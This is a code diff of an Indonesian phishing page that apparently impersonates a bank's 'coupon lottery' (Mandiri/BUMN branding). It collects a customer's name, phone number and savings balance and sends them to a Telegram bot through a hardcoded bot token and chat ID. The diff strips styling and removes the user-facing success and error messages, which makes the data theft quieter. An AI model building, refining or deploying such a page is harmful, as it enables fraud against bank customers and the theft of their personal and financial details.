@@ -2,314 +2,35 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lengkapi Data Pencetakan Kupon</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(180deg, #dfe6ef 0%, #c8d4e0 100%);
-            min-height: 100vh;
-            overflow-x: hidden;
-            padding-bottom: 100px;
-        }
-
-        /* ===== HEADER ===== */
-        .header {
-            width: 100%;
-            background: #0079c2;
-            overflow: hidden;
-        }
-
-        .header img {
-            width: 100%;
-            height: 55px;
-            object-fit: cover;
-            object-position: center;
-            display: block;
-        }
-
-        /* ===== TITLE ===== */
-        .title-section {
-            text-align: center;
-            padding: 16px 16px 10px;
-        }
-
-        .title-section h1 {
-            color: #0079c2;
-            font-size: 17px;
-            font-weight: 700;
-            letter-spacing: 0.2px;
-        }
-
-        /* ===== MAIN CARD ===== */
-        .main-card {
-            margin: 0 14px;
-            background: #e8ecf1;
-            border-radius: 16px;
-            padding: 12px;
-            box-shadow:
-                inset 0 1px 1px rgba(255,255,255,0.8),
-                0 2px 6px rgba(0,0,0,0.08);
-        }
-
-        /* ===== KUPON IMAGE ===== */
-        .kupon-wrap {
-            width: 100%;
-            border-radius: 14px;
-            overflow: hidden;
-            margin-bottom: 14px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-
-        .kupon-wrap img {
-            width: 100%;
-            height: 210px;
-            object-fit: cover;
-            object-position: center;
-            display: block;
-        }
-
-        /* ===== FORM ===== */
-        .form-group {
-            margin-bottom: 12px;
-        }
-
-        .form-label {
-            color: #0079c2;
-            font-size: 13px;
-            font-weight: 700;
-            margin-bottom: 5px;
-            display: block;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 13px 14px;
-            border: 2px solid #0079c2;
-            border-radius: 10px;
-            font-size: 14px;
-            color: #333;
-            background: #fff;
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        .form-input:focus {
-            border-color: #005a91;
-            box-shadow: 0 0 0 3px rgba(0, 121, 194, 0.15);
-        }
-
-        .form-input::placeholder {
-            color: #aaa;
-        }
-
-        /* ===== SUBMIT BUTTON ===== */
-        .submit-btn {
-            width: 100%;
-            padding: 15px;
-            margin-top: 6px;
-            background: #a8d0f0;
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: not-allowed;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: all 0.3s ease;
-            opacity: 0.7;
-        }
-
-        /* Tombol aktif - semua field terisi */
-        .submit-btn.active {
-            background: #0079c2;
-            cursor: pointer;
-            opacity: 1;
-            box-shadow: 0 4px 12px rgba(0, 121, 194, 0.3);
-        }
-
-        .submit-btn.active:hover {
-            background: #005a91;
-        }
-
-        .submit-btn.active:active {
-            transform: scale(0.98);
-            box-shadow: 0 2px 6px rgba(0, 121, 194, 0.3);
-        }
-
-        /* Loading spinner */
-        .submit-btn.loading {
-            pointer-events: none;
-            opacity: 0.8;
-        }
-
-        .spinner {
-            display: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #fff;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-
-        .submit-btn.loading .spinner {
-            display: inline-block;
-        }
-
-        .submit-btn.loading .btn-text {
-            display: none;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* ===== TOAST NOTIFICATION ===== */
-        .toast {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%) translateY(-100px);
-            padding: 14px 24px;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #fff;
-            z-index: 200;
-            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            text-align: center;
-            max-width: 90%;
-        }
-
-        .toast.show {
-            transform: translateX(-50%) translateY(0);
-        }
-
-        .toast.success {
-            background: #28a745;
-        }
-
-        .toast.error {
-            background: #dc3545;
-        }
-
-        /* ===== BOTTOM NAV ===== */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #fff;
-            border-radius: 24px 24px 0 0;
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-            overflow: hidden;
-            z-index: 100;
-        }
-
-        .bottom-nav img {
-            width: 100%;
-            height: 72px;
-            object-fit: cover;
-            object-position: center bottom;
-            display: block;
-        }
-
-        /* ===== BUBBLE BADGE ===== */
-        .badge-bubble {
-            position: fixed;
-            bottom: 80px;
-            right: 10px;
-            background: #0d47a1;
-            color: #fff;
-            padding: 5px 10px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-weight: 500;
-            z-index: 99;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .badge-bubble::before {
-            content: ".b";
-            font-weight: 700;
-            font-size: 13px;
-            margin-right: 2px;
-        }
-    </style>
-<base target="_blank">
 </head>
 <body>
-
-    <!-- Toast Notification -->
-    <div class="toast" id="toast"></div>
-
-    <!-- HEADER: 1 gambar strip panjang (Logo BUMN + Logo Mandiri) -->
-    <div class="header">
-        <img src="" alt="Header Logo" id="img-header">
-    </div>
-
-    <!-- TITLE -->
-    <div class="title-section">
-        <h1>Lengkapi data Pencetakan Kupon</h1>
-    </div>
-
-    <!-- MAIN CARD -->
-    <div class="main-card">
-        <!-- KUPON: 1 gambar panjang landscape -->
-        <div class="kupon-wrap">
-            <img src="" alt="Kupon Undian" id="img-kupon">
+    <h1>Lengkapi data Pencetakan Kupon</h1>
+    
+    <form id="form-kupon" onsubmit="return handleSubmit(event)">
+        <div>
+            <label>Nama Lengkap Nasabah</label><br>
+            <input type="text" placeholder="Masukan Nama Lengkap" id="nama" oninput="checkForm()">
         </div>
-
-        <!-- FORM -->
-        <form id="form-kupon" onsubmit="return handleSubmit(event)">
-            <div class="form-group">
-                <label class="form-label">Nama Lengkap Nasabah</label>
-                <input type="text" class="form-input" placeholder="Masukan Nama Lengkap" id="nama" oninput="checkForm()">
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">Nomor Handphone</label>
-                <input type="tel" class="form-input" placeholder="Masukan Nomor Handphone" id="nohp" oninput="checkForm()">
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">Saldo Rekening Tabungan saat Ini</label>
-                <input type="text" class="form-input" placeholder="Sisa Saldo" id="saldo" oninput="checkForm()">
-            </div>
-
-            <button type="submit" class="submit-btn" id="submitBtn" disabled>
-                <span class="spinner"></span>
-                <span class="btn-text">DAFTAR KUPON</span>
-            </button>
-        </form>
-    </div>
-
-    <!-- BOTTOM NAV: 1 gambar strip panjang (semua icon nav) -->
-    <nav class="bottom-nav">
-        <img src="" alt="Bottom Navigation" id="img-bottomnav">
-    </nav>
-
-    <!-- BUBBLE BADGE (CSS only) -->
-    <div class="badge-bubble">Built on Bubble</div>
+        <br>
+        <div>
+            <label>Nomor Handphone</label><br>
+            <input type="tel" placeholder="Masukan Nomor Handphone" id="nohp" oninput="checkForm()">
+        </div>
+        <br>
+        <div>
+            <label>Saldo Rekening Tabungan saat Ini</label><br>
+            <input type="text" placeholder="Sisa Saldo" id="saldo" oninput="checkForm()">
+        </div>
+        <br>
+        <button type="submit" id="submitBtn" disabled>DAFTAR KUPON</button>
+    </form>
 
     <script>
         // ===== KONFIGURASI TELEGRAM (TIDAK TAMPAK DI LAYAR) =====
-        // Ganti nilai di bawah ini dengan Bot Token dan Chat ID Anda
-        const botToken = "7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM"; // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2vLKu8
-        const chatId = "7213790655";    // Contoh: 123456789
+        const botToken = "7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM";
+        const chatId = "7213790655";
 
         // ===== CEK FORM =====
         function checkForm() {
@@ -319,10 +40,8 @@
             const btn = document.getElementById('submitBtn');
 
             if (nama !== '' && nohp !== '' && saldo !== '') {
-                btn.classList.add('active');
                 btn.disabled = false;
             } else {
-                btn.classList.remove('active');
                 btn.disabled = true;
             }
         }
@@ -344,17 +63,6 @@
             checkForm();
         });
 
-        // ===== TOAST =====
-        function showToast(message, type) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.className = 'toast ' + type;
-            setTimeout(() => toast.classList.add('show'), 10);
-            setTimeout(() => {
-                toast.classList.remove('show');
-            }, 4000);
-        }
-
         // ===== KIRIM KE TELEGRAM =====
         async function handleSubmit(e) {
             e.preventDefault();
@@ -364,11 +72,9 @@
             const saldo = document.getElementById('saldo').value.trim();
             const btn = document.getElementById('submitBtn');
 
-            // Loading state
-            btn.classList.add('loading');
             btn.disabled = true;
+            btn.textContent = "Mengirim...";
 
-            // Format pesan
             const pesan = `
 <b>🎫 KUPON UNDIAN - DATA BARU</b>
 
@@ -398,18 +104,13 @@
                 const data = await response.json();
 
                 if (data.ok) {
-                    showToast('Berhasil! Data kupon telah dikirim.', 'success');
-                    // Reset form
                     document.getElementById('form-kupon').reset();
-                    checkForm();
-                } else {
-                    showToast('Gagal: ' + (data.description || 'Unknown error'), 'error');
                 }
             } catch (error) {
-                showToast('Gagal mengirim. Periksa koneksi & konfigurasi!', 'error');
+                // Tidak ada notifikasi
             } finally {
-                btn.classList.remove('loading');
                 btn.disabled = false;
+                btn.textContent = "DAFTAR KUPON";
                 checkForm();
             }
 
